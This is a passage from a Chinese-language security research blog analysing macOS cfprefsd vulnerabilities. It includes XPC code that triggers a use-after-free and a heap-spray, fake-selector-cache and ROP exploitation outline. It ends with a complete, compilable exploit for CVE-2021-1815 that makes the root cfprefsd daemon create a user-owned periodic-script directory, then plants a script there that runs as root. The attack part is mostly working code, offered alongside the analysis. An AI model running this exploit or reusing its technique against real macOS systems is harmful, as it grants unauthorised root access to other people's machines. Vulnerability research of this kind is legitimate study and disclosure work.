xpc_connection_create_mach_service(&quot;com.apple.cfprefsd.agent&quot;,0,0);</span><br><span class="line">    #else</span><br><span class="line">        printf(&quot;DAEMON\n&quot;);</span><br><span class="line">        xpc_connection_t conn = xpc_connection_create_mach_service(&quot;com.apple.cfprefsd.daemon&quot;,0,XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);</span><br><span class="line">    #endif</span><br><span class="line">        xpc_connection_set_event_handler(conn, ^(xpc_object_t response) &#123;</span><br><span class="line">            xpc_type_t t = xpc_get_type(response);</span><br><span class="line">            if (t == XPC_TYPE_ERROR)&#123;</span><br><span class="line">                printf(&quot;err: %s\n&quot;, xpc_dictionary_get_string(response, XPC_ERROR_KEY_DESCRIPTION));</span><br><span class="line">                need_stop = 1 ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        xpc_connection_resume(conn);</span><br><span class="line">       </span><br><span class="line">        xpc_object_t hello = xpc_dictionary_create(NULL, NULL, 0);</span><br><span class="line">        xpc_object_t arr = xpc_array_create(NULL, 0);</span><br><span class="line">   </span><br><span class="line">        xpc_object_t arr_free = xpc_dictionary_create(NULL, NULL, 0);</span><br><span class="line">        xpc_dictionary_set_int64(arr_free, &quot;CFPreferencesOperation&quot;, 4);</span><br><span class="line">        xpc_array_append_value(arr, arr_free);</span><br><span class="line">        for (int i=0; i&lt;FREE_COUNT; i++) &#123;</span><br><span class="line">            xpc_object_t arr_elem1 = xpc_dictionary_create(NULL, NULL, 0);</span><br><span class="line">            xpc_dictionary_set_int64(arr_elem1, &quot;CFPreferencesOperation&quot;, 20);</span><br><span class="line">            xpc_array_append_value(arr, arr_elem1);</span><br><span class="line">        &#125;</span><br><span class="line">        //printf(&quot;%p, %p\n&quot;, arr_elem1, hello);</span><br><span class="line">        xpc_dictionary_set_int64(hello, &quot;CFPreferencesOperation&quot;, 5);</span><br><span class="line">        xpc_dictionary_set_value(hello, &quot;CFPreferencesMessages&quot;, arr);</span><br><span class="line"> </span><br><span class="line">        //NSLog (@&quot;%@&quot;, hello);</span><br><span class="line">        fill_once();</span><br><span class="line">        xpc_connection_send_message(conn, hello);</span><br><span class="line">        NSLog(@&quot; trigger vuln&quot;);</span><br><span class="line">        xpc_release(hello);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main(int argc, const char * argv[]) &#123;</span><br><span class="line"> </span><br><span class="line">    pthread_t fillthread1,triger_thread;</span><br><span class="line">    NSLog(@&quot;start to trigger..&quot;);</span><br><span class="line">    trigger_vul();</span><br><span class="line"> </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用-PZ"><a href="#漏洞利用-PZ" class="headerlink" title="漏洞利用 - PZ"></a>漏洞利用 - PZ</h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>还是在两次xpc_release中间，填充被释放的内存空间，通过并行运行的四个线程来实现，线程A、B和C启动并等待全局变量设置为1。当全局变量为1时，线程A、B和C分别尝试发送100次下面的XPC消息给服务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这不是一个有效的multiMessage</span></span><br><span class="line">&#123; <span class="string">&quot;CFPreferencesOperation&quot;</span>: 5,</span><br><span class="line">  <span class="string">&quot;CFPreferencesMessages&quot;</span> : [10<span class="string">&#x27;000 * xpc_data_spray] &#125;</span></span><br></pre></td></tr></table></figure>

<p>xpc_data_spray大小为448字节，目标地址是0x118080000。</p>
<h4 id="控制PC-1"><a href="#控制PC-1" class="headerlink" title="控制PC"></a>控制PC</h4><p>该漏洞将由子消息触发，其中操作键被映射到不会调用reply的处理程序。攻击者选择了操作4，由handleFlushSourceForDomainMessage处理。触发器消息如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;CFPreferencesOperation&quot;: 5</span><br><span class="line">  &quot;CFPreferencesMessages&quot; :</span><br><span class="line">    [</span><br><span class="line">      8000 * (op_1_dict, second_op_5_dict),</span><br><span class="line">      150 * (second_op_5_dict, op_4_dict, op_4_dict, op_4_dict),</span><br><span class="line">      third_op_5_dict</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>子消息如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">op_1_dict = &#123;</span><br><span class="line">  &quot;CFPreferencesOperation&quot;: 1,</span><br><span class="line">  &quot;domain&quot;: &quot;a&quot;,</span><br><span class="line">  &quot;A&quot;: 8_byte_xpc_data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">second_op_5_dict = &#123;</span><br><span class="line">  &quot;CFPreferencesOperation&quot;: 5</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">op_4_dict = &#123;</span><br><span class="line">  &quot;CFPreferencesOperation&quot;: 4</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">third_op_5_dict = &#123;</span><br><span class="line">  &quot;CFPreferencesOperation&quot;: 5</span><br><span class="line">  &quot;CFPreferencesMessages&quot; : [0x2000 * xpc_send_right,</span><br><span class="line">                             0x10 * xpc_data_heapspray]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的思路中说到，如果堆喷成功填充0x118080000处的内存的话，接下来就是调用xpc_release()函数，来进行释放。题外话，OC对象的第一个qword是它的isa指针，定义了对象的类型。xpc_release()函数会检查libxpc的__objc_data中是否有isa指针，如果存在，则调用os_object_release()函数；由于填充的0x118080000是一个虚假isa指针，因此会走另一条路，调用objc_release()函数。如果类对象的字段中的FAST_ALLOC位（偏移为0x20处字节的第2位）被清零，则释放选择器被发送到对象。</p>
<p>这种虚假选择器缓存技术可以参考<a target="_blank" rel="noopener" href="http://phrack.org/issues/69/9.html#article">Modern Objective-C Exploitation Techniques</a>。</p>
<p><img src="https://1.bp.blogspot.com/-47GnhJdhCx8/XWgi-xKfCOI/AAAAAAAANSU/7DRaHOJNZyomgFByAHrWqfsRbVgDA55kgCEwYBhgL/s1600/cfprefsd%2Bfake%2Bselector%2Bcache%2B-%2BHI_RES.png"></p>
<p>obj_msgSend负责处理选择器调用的本机函数。首先，obj_msgSend根绝isa指针，找到0x10处的(function_pointer, selector)对的数组，如果选择器与缓存中的条目匹配，就会调用缓存的函数指针。</p>
<p>控制PC后，接下来通过ROP，调用IOServiceMatching、IOServiceGetMatchingService和IOServiceOpen来获取一个IOKit UserClient mach端口发送权限。攻击者使用内存写入小工具将该端口名称写入他们连续发送的四个exfil消息。在WebContent进程中，在端口集上侦听消息。如果收到该消息，则会在其中发送一个ProvInfoIOKitUserClient。</p>
<p>ProvInfoIOKitUserClient将是另一个内核漏洞的故事了，有机会再说。</p>
<h2 id="CVE-2020-9839"><a href="#CVE-2020-9839" class="headerlink" title="CVE-2020-9839"></a>CVE-2020-9839</h2><h2 id="CVE-2021-1815"><a href="#CVE-2021-1815" class="headerlink" title="CVE-2021-1815"></a>CVE-2021-1815</h2><p>CVE-2020-9839的patch如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _CFPrefsCreatePreferencesDirectory(path) &#123;</span><br><span class="line">    <span class="type">int</span> dirfd = open(<span class="string">&quot;/&quot;</span>, O_DIRECTORY);</span><br><span class="line">    <span class="keyword">for</span>(slice in path.split(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">int</span> fd = openat(dirfd, slice, O_DIRECTORY);</span><br><span class="line">        <span class="keyword">if</span> (fd == <span class="number">-1</span> &amp;&amp; errno == ENOENT &amp;&amp; !mkdirat(dirfd, slice, perm)) &#123;</span><br><span class="line">            fd = openat(dirfd, slice, O_DIRECTORY|O_NOFOLLOW);</span><br><span class="line">            <span class="keyword">if</span> ( fd == <span class="number">-1</span> ) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            fchown(fd, uid, gid);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; <span class="comment">// close all fds return 0;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Apple 的修复确保不再遵循符号链接，因此无法再更改任意目录上的所有权。但该补丁不足以完全阻止权限提升。上面显示的代码仍然允许用户使用<strong>用户</strong>或<strong>root</strong>权限创建目录。由于目录位置在攻击者的控制之下，这可能会被滥用以将权限提升到 root。</p>
<p>macOS 使用维护脚本，即每天、每周和每月以 root 权限运行的定期脚本。周期性脚本通过**&#x2F;etc&#x2F;defaults&#x2F;periodic.conf**文件进行配置。此脚本也可以由用户定义：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 周期性脚本目录</span><br><span class="line">local_periodic=&quot;/usr/local/etc/periodic&quot;</span><br></pre></td></tr></table></figure>

<p>在默认 macOS 安装中，这个目录不存在。这意味着我们可以通过连接到<strong>cfprefsd</strong>守护程序服务并要求<strong>dameon</strong>将目录的所有权设置给我们的用户来创建此目录。创建此目录后，我们可以在那里创建我们的脚本（因为该位置将由用户拥有）并且该脚本将以 root 身份运行。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -framework Foundation cfprefsd_exploit.m -o cfprefsd_exploit</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#import <span class="string">&lt;Foundation/Foundation.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xpc/xpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> *serviceName = <span class="string">&quot;com.apple.cfprefsd.daemon&quot;</span>;</span><br><span class="line">    <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">xpc_connection_t</span> conn;</span><br><span class="line">    <span class="type">xpc_object_t</span> msg;</span><br><span class="line"></span><br><span class="line">    conn = <span class="built_in">xpc_connection_create_mach_service</span>(serviceName, <span class="literal">NULL</span>, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);</span><br><span class="line">    <span class="keyword">if</span> (conn == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;xpc_connection_create_mach_service&quot;</span>);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">xpc_connection_set_event_handler</span>(conn, ^(<span class="type">xpc_object_t</span> obj) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;xpc_connection_set_event_handler&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">xpc_connection_resume</span>(conn);</span><br><span class="line"></span><br><span class="line">    msg = <span class="built_in">xpc_dictionary_create</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">xpc_dictionary_set_int64</span>(msg, <span class="string">&quot;CFPreferencesOperation&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">xpc_dictionary_set_bool</span>(msg, <span class="string">&quot;CFPreferencesUseCorrectOwner&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//create as user</span></span><br><span class="line">    <span class="built_in">xpc_dictionary_set_string</span>(msg, <span class="string">&quot;CFPreferencesUser&quot;</span>, <span class="string">&quot;kCFPreferencesCurrentUser&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">xpc_dictionary_set_string</span>(msg, <span class="string">&quot;CFPreferencesHostBundleIdentifier&quot;</span>, <span class="string">&quot;prefs&quot;</span>);</span><br><span class="line">    <span class="built_in">xpc_dictionary_set_string</span>(msg, <span class="string">&quot;CFPreferencesDomain&quot;</span>, <span class="string">&quot;/usr/local/etc/periodic/daily/a.plist&quot;</span>);</span><br><span class="line">    <span class="built_in">xpc_dictionary_set_string</span>(msg, <span class="string">&quot;Key&quot;</span>, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">    <span class="built_in">xpc_dictionary_set_string</span>(msg, <span class="string">&quot;Value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">xpc_connection_send_message</span>(conn, msg);</span><br><span class="line">    <span class="built_in">usleep</span>(<span class="number">1000000</span>);</span><br><span class="line">   </span><br><span class="line">    NSString* script = @<span class="string">&quot;touch /Library/privesc.txt\n&quot;</span>;</span><br><span class="line">    NSError *error;</span><br><span class="line">    BOOL succeed = [script writeToFile:@<span class="string">&quot;/usr/local/etc/periodic/daily/111.lpe&quot;</span> atomically:YES encoding:NSUTF8StringEncoding error:&amp;error];</span><br><span class="line">    <span class="keyword">if</span> (!succeed)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Couldn&#x27;t create periodic script :(\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="type">char</span> mode[] = <span class="string">&quot;0777&quot;</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    i = <span class="built_in">strtol</span>(mode, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">chmod</span>(<span class="string">&quot;/usr/local/etc/periodic/daily/111.lpe&quot;</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此漏洞利用将向以 root<strong>身份</strong>运行的<strong>cfprefsd</strong>守护进程发起 XPC 消息。这由服务名称<strong>com.apple.cfprefsd.daemon</strong>标识（用户模式守护进程被标识为<strong>com.apple.cfprefsd.agent</strong>）。守护进程将创建文件夹**&#x2F;usr&#x2F;local&#x2F;etc&#x2F;periodic&#x2F;daily&#x2F;<strong>然后将我们的脚本写入该位置，该位置将运行</strong>touch &#x2F;Library&#x2F;privesc.txt**。</p>
<p>如果需要，我们还可以在漏洞利用中使用以下行以 root 身份创建一个目录。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xpc_dictionary_set_string(msg, &quot;CFPreferencesUser&quot;, &quot;root&quot;);</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://gts3.org/assets/papers/2020/jin:pwn2own2020-safari-slides.pdf">Compromising the macOS Kernel through Safari by Chaining Six Vulnerabilities</a></p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/tags/ios/page/0/">Previous</a></div><div class="pagination-next"><a href="/tags/ios/page/2/">Next</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/tags/ios/">1</a></li><li><a class="pagination-link" href="/tags/ios/page/2/">2</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://avatars.githubusercontent.com/u/19711495?v=4" alt="buffer0verflooow"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">buffer0verflooow</p><p class="is-size-6 is-block">Security Researcher</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Beijing</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">56</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">51</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="me noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-10T06:23:56.000Z">2022-10-10</time></p><p class="title"><a href="/2022/10/10/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-30T07:29:09.000Z">2022-07-30</time></p><p class="title"><a href="/2022/07/30/Android%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">Android安全笔记</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-20T12:35:56.000Z">2022-07-20</time></p><p class="title"><a href="/2022/07/20/Android%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">Android中间人攻击方法整理</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-04T12:34:01.000Z">2022-07-04</time></p><p class="title"><a href="/2022/07/04/Android-11-%E9%AD%94%E5%BD%A2%E5%A5%B3%E6%BC%8F%E6%B4%9E/">Android 11 魔形女漏洞</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-01T13:59:36.000Z">2022-07-01</time></p><p class="title"><a href="/2022/07/01/macOS-Intel%E5%9B%BE%E5%BD%A2%E5%86%85%E6%A0%B8%E6%8B%93%E5%B1%95RCE-EOP/">macOS Intel图形内核拓展RCE+EOP</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/10/"><span class="level-start"><span class="level-item">October 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">July 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/06/"><span class="level-start"><span class="level-item">June 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">May 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/04/"><span class="level-start"><span class="level-item">April 2022</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">March 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">February 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">January 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">December 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">November 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">August 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ASN-1/"><span class="tag">ASN.1</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/AppleAVE2/"><span class="tag">AppleAVE2</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ContentProvider/"><span class="tag">ContentProvider</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/IOServices/"><span class="tag">IOServices</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/LPE/"><span class="tag">LPE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PendingIntent/"><span class="tag">PendingIntent</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/adobe/"><span class="tag">adobe</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/afl/"><span class="tag">afl++</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ams/"><span class="tag">ams</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/android/"><span class="tag">android</span><span class="tag">18</span></a></div><div class="control"><a class="tags has-addons" href="/tags/aosp/"><span class="tag">aosp</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/apple/"><span class="tag">apple</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/arm64/"><span class="tag">arm64</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cfprefsd/"><span class="tag">cfprefsd</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/chrome/"><span class="tag">chrome</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/darwin/"><span class="tag">darwin</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/exploit/"><span class="tag">exploit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/fuzz/"><span class="tag">fuzz</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/gpu/"><span class="tag">gpu</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hook/"><span class="tag">hook</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/intel/"><span class="tag">intel</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/intent/"><span class="tag">intent</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/iomfb/"><span class="tag">iomfb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ios/"><span class="tag">ios</span><span class="tag">14</span></a></div><div class="control"><a class="tags has-addons" href="/tags/linux/"><span class="tag">linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/logic-vul/"><span class="tag">logic vul</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/lpe/"><span class="tag">lpe</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mach/"><span class="tag">mach</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/macos/"><span class="tag">macos</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mig/"><span class="tag">mig</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/note/"><span class="tag">note</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/npu/"><span class="tag">npu</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pac/"><span class="tag">pac</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pipe/"><span class="tag">pipe</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pongoOS/"><span class="tag">pongoOS</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qemu/"><span class="tag">qemu</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qualcom/"><span class="tag">qualcom</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qualcomm/"><span class="tag">qualcomm</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rce/"><span class="tag">rce</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/safari/"><span class="tag">safari</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/samsung/"><span class="tag">samsung</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/soot/"><span class="tag">soot</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/static-analysis/"><span class="tag">static analysis</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/syzkaller/"><span class="tag">syzkaller</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tcc/"><span class="tag">tcc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/telecom/"><span class="tag">telecom</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/uaf/"><span class="tag">uaf</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/vul/"><span class="tag">vul</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/webaudio/"><span class="tag">webaudio</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xnu/"><span class="tag">xnu</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xpc/"><span class="tag">xpc</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="buffer0verflooow - Blog" height="28"></a><p class="is-size-7"><span>&copy; 2024 buffer0verflooow</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2019</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
